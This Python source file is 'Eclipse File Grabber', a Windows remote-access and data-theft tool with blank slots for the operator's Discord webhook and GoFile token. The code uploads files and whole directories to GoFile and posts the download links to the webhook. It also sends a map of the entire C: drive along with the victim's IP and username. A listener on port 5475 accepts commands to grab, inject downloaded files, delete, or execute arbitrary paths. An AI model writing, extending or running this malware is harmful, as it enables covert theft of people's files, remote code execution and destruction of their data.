# Proudly made by Alderite - https://github.com/alderite
# Eclipse File Grabber is under the GNU General Public License v3 (2007).
# Credit to https://github.com/Coosta6915/gofile for the gofile API wrapper

import json
import os
import shutil
import time
import zipfile
import urllib.request
from threading import Thread

import requests
import socket
from discord_webhook import DiscordWebhook

__webhook__ = ""  # Put your webhook here
__gofileToken__ = ""  # Put your GoFile token here
__ip__ = ''  # Put your machines IP here


class Util(object):
    def __init__(this):
        this.webhook = __webhook__
        this.gofiletoken = __gofileToken__

    @staticmethod
    def getSize(bytes, suffix="B"):
        """
        Scale bytes to its proper format
        """
        factor = 1024
        for unit in ["", "K", "M", "G", "T", "P"]:
            if bytes < factor:
                return f"{bytes:.2f}{unit}{suffix}"
            bytes /= factor

    @staticmethod
    def goFileResponseHandler(response):
        if response["status"] == "ok":
            return response["data"]

        elif "error-" in response["status"]:
            error = response["status"].split("-")[1]
            raise Exception(error)

    def getGoFileServer(this):
        getServer_response = requests.get(
            url="https://api.gofile.io/getServer"
        ).json()

        return this.goFileResponseHandler(getServer_response)

    def uploadFile(this, file: str, password: str = None):
        # GoFile doesn't set a password if it is less than 4 characters
        try:
            file = open(file, "rb")
        except PermissionError:
            print('EclipseFileManager does not have permissions to access this file/directory')
        else:
            if password != None and len(password) < 4:
                raise Exception("passwordLength")
            server = this.getGoFileServer()["server"]
            uploadFile_response = requests.post(
                url=f"https://{server}.gofile.io/uploadFile",
                data={
                    "token": __gofileToken__
                },

                files={"upload_file": file},
                verify=False
            ).json()

            response = this.goFileResponseHandler(uploadFile_response)

            webhook = DiscordWebhook(
                url=__webhook__,
                username='Eclipse File Grabber-' + os.getlogin(), content=response['downloadPage'])
            response = webhook.execute()

    def send(this, msg):
        webhook = DiscordWebhook(
            url=__webhook__,
            username='Eclipse File Grabber-' + os.getlogin(), content=msg)
        response = webhook.execute()

    @staticmethod
    def getType(path):
        if os.path.isdir(path):
            return 'dir'
        elif os.path.isfile(path):
            return 'file'

    def get_file_tree(this, directory):
        tree = {}
        for root, dirs, files in os.walk(directory):
            node = tree
            for dir in root.split(os.path.sep):
                node = node.setdefault(dir, {})
            for file in files:
                try:
                    node[file] = f'file,{this.getSize(os.path.getsize(os.path.join(root, file)))}'
                except:
                    node[file] = 'file,COULD NOT FIND SIZE'

        return tree

    def write_file_tree(this, directory, output_file):
        tree = this.get_file_tree(directory)
        with open(output_file, 'w') as f:
            json.dump(tree, f, indent=4)


class Modules(Util):
    def __init__(this):
        super().__init__()
        this.output_file = 'C:\\Windows\\Temp\\file_tree.json'
        this.zip_path = f'C:\\Windows\\Temp\\{os.getlogin()}-file_tree.zip'

    def grabFile(this, path):
        try:
            type = this.getType(path)
            this.zip_path = f"C:\\Windows\\Temp\\{os.path.basename(path)}.zip"
            if type == 'dir':
                with zipfile.ZipFile(this.zip_path, 'w', zipfile.ZIP_DEFLATED) as archive:
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            archive.write(file_path, os.path.relpath(file_path, path))

                this.uploadFile(this.zip_path)
                os.remove(this.zip_path)
            elif type == 'file':
                this.uploadFile(path)
        except PermissionError as e:
            this.send(e)

    def injectFile(this, url, injectpath):
        try:
            with urllib.request.urlopen(url) as response:
                # Get the filename from the URL
                filename = os.path.basename(url)
                if os.path.exists(injectpath + "\\" + filename):
                    print('file already exists')
                else:
                    with open(filename, 'wb') as out_file:
                        data = response.read()
                        out_file.write(data)
                    shutil.move(filename, injectpath)
                this.send(f"injected {url} at {injectpath}")
        except PermissionError as e:
            this.send(e)
        except:
            this.send('something went wrong!')

    def remoteExecute(this, path):
        os.popen(path)

    def delete(this, path):
        if os.path.isdir(path):
            try:
                shutil.rmtree(path)
                this.send(f"Deleted {path}")
            except FileNotFoundError:
                this.send(f"{path} doesn't exist")
            except PermissionError:
                this.send(f"Eclipse File Manager doesn't have permissions to delete {path}")
        elif os.path.isfile(path):
            try:
                os.remove(path)
                this.send(f"Deleted {path}")
            except FileNotFoundError:
                this.send(f"{path} doesn't exist")
            except PermissionError:
                this.send(f"Eclipse File Manager doesn't have permissions to delete {path}")

    def rename(this, path, newname):
        if os.path.exists(path):
            newname = os.path.dirname(path) + '\\' + newname
            os.rename(path, newname)
        else:
            print(f'{path}   does not exist')

    def update(this):
        this.sendTree('C:\\')

    def sendTree(this, toplevel):
        this.write_file_tree(toplevel, this.output_file)
        print('wrote file')
        with zipfile.ZipFile(this.zip_path, 'w', zipfile.ZIP_DEFLATED) as archive:
            archive.write(this.output_file, arcname=this.output_file.split('/')[-1])
        print('zipped file')

        this.uploadFile(this.zip_path)
        os.remove(this.output_file)


class EclipseFileManager():
    def __init__(this):
        this.modules = Modules()
        this.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        this.port = 5475
        this.server_socket.bind((socket.gethostbyname(socket.gethostname()), this.port))

    def checkip(this):
        prev_ip = None
        while True:
            # Get the current IP address
            current_ip = socket.gethostbyname(socket.gethostname())
            if current_ip != prev_ip:
                this.modules.send("IP address has changed from {prev_ip} to {current_ip}")
                prev_ip = current_ip
            time.sleep(60)

    def moduleManager(this, data):
        data = data.split("|")

        if data[0] == 'grab':
            path = data[1]
            print(path)
            this.modules.grabFile(path)
        elif data[0] == 'inject':
            path = data[1]
            print(path)
            url = data[2]
            print(url)
            this.modules.injectFile(url, path)
        elif data[0] == 'delete':
            path = data[1]
            print(path)
            this.modules.delete(path)
        elif data[0] == 'execute':
            path = data[1]
            print(path)
            this.modules.remoteExecute(path)
        elif data[0] == 'update':
            this.modules.update()

    def listen(this):
        this.server_socket.listen(1)
        while True:
            # establish a connection
            client_socket, addr = this.server_socket.accept()
            print('Got a connection from %s' % str(addr))
            data = client_socket.recv(1024).decode('utf-8')
            print('Received message: %s' % data)

            Thread(target=this.moduleManager, args=(data,)).start()
            client_socket.close()

    def Main(this):
        # this.modules.sendTree('C:\\')
        this.modules.send(f'My ip is {socket.gethostbyname(socket.gethostname())}!')
        Thread(target=this.checkip).start()
        this.listen()

if __name__ == "__main__":
    EclipseFileManager().Main()
